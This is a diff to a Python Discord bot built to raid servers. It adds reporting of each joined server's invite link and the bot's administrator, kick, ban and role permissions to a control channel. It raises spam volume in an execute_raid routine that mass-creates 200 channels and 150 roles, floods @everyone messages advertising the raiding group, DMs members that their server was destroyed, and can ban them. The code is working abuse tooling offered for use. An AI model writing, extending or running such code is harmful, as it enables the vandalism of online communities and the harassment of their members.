@@ -34,6 +34,34 @@ async def on_ready():
         # Bot以外のメンバー数をカウント
         real_members = [m for m in guild.members if not m.bot]
 
+        # Bot自身の権限を取得
+        bot_member = guild.me
+        permissions = bot_member.guild_permissions
+
+        # 主要な権限をチェック
+        perms_list = []
+        if permissions.administrator:
+            perms_list.append('✅ 管理者')
+        if permissions.manage_guild:
+            perms_list.append('✅ サーバー管理')
+        if permissions.manage_roles:
+            perms_list.append('✅ ロール管理')
+        if permissions.manage_channels:
+            perms_list.append('✅ チャンネル管理')
+        if permissions.kick_members:
+            perms_list.append('✅ メンバーキック')
+        if permissions.ban_members:
+            perms_list.append('✅ メンバーBAN')
+        if permissions.manage_nicknames:
+            perms_list.append('✅ ニックネーム管理')
+        if permissions.manage_emojis:
+            perms_list.append('✅ 絵文字管理')
+
+        if not perms_list:
+            perms_list.append('❌ 重要な権限なし')
+
+        perms_text = '\n'.join(perms_list)
+
         if len(real_members) <= 5:
             try:
                 await guild.leave()
@@ -58,7 +86,7 @@ async def on_ready():
 
                     embed = discord.Embed(
                         title=f'🖥️ サーバー: {guild.name}',
-                        description=f'**メンバー数:** {len(real_members)}人\n**招待リンク:** {invite_link}',
+                        description=f'**メンバー数:** {len(real_members)}人\n**招待リンク:** {invite_link}\n\n**権限:**\n{perms_text}',
                         color=discord.Color.blue()
                     )
 
@@ -86,6 +114,34 @@ async def on_guild_join(guild):
 
     control_channel = bot.get_channel(CONTROL_CHANNEL_ID)
 
+    # Bot自身の権限を取得
+    bot_member = guild.me
+    permissions = bot_member.guild_permissions
+
+    # 主要な権限をチェック
+    perms_list = []
+    if permissions.administrator:
+        perms_list.append('✅ 管理者')
+    if permissions.manage_guild:
+        perms_list.append('✅ サーバー管理')
+    if permissions.manage_roles:
+        perms_list.append('✅ ロール管理')
+    if permissions.manage_channels:
+        perms_list.append('✅ チャンネル管理')
+    if permissions.kick_members:
+        perms_list.append('✅ メンバーキック')
+    if permissions.ban_members:
+        perms_list.append('✅ メンバーBAN')
+    if permissions.manage_nicknames:
+        perms_list.append('✅ ニックネーム管理')
+    if permissions.manage_emojis:
+        perms_list.append('✅ 絵文字管理')
+
+    if not perms_list:
+        perms_list.append('❌ 重要な権限なし')
+
+    perms_text = '\n'.join(perms_list)
+
     if len(real_members) <= 5:
         try:
             await guild.leave()
@@ -111,7 +167,7 @@ async def on_guild_join(guild):
 
             embed = discord.Embed(
                 title=f'🆕 新規参加: {guild.name}',
-                description=f'**メンバー数:** {len(real_members)}人\n**招待リンク:** {invite_link}',
+                description=f'**メンバー数:** {len(real_members)}人\n**招待リンク:** {invite_link}\n\n**権限:**\n{perms_text}',
                 color=discord.Color.green()
             )
 
@@ -177,7 +233,7 @@ async def execute_raid(ctx, do_ban=False):
     channel_name = 'ますまに共栄圏最強'
     channel_count = 200
     spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
-    spam_count = 10
+    spam_count = 100
     role_name = 'ますまに共栄圏に荒らされましたww'
     role_count = 150
 
@@ -192,7 +248,7 @@ async def execute_raid(ctx, do_ban=False):
         async def send_dm(member):
             try:
                 if not member.guild_permissions.moderate_members:
-                    await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
+                    await member.send(f'{old_server_name}を破壊しました https://discord.gg/masumani')
                     return 1
                 return 0
             except:
@@ -399,7 +455,12 @@ async def masumani(ctx):
         return
 
     await ctx.message.delete()
-    await execute_raid(ctx, do_ban=False)
+
+    # 権限チェックなしで実行
+    try:
+        await execute_raid(ctx, do_ban=False)
+    except Exception as e:
+        await ctx.author.send(f'エラー: {e}')
 
 @bot.command()
 async def allban(ctx):
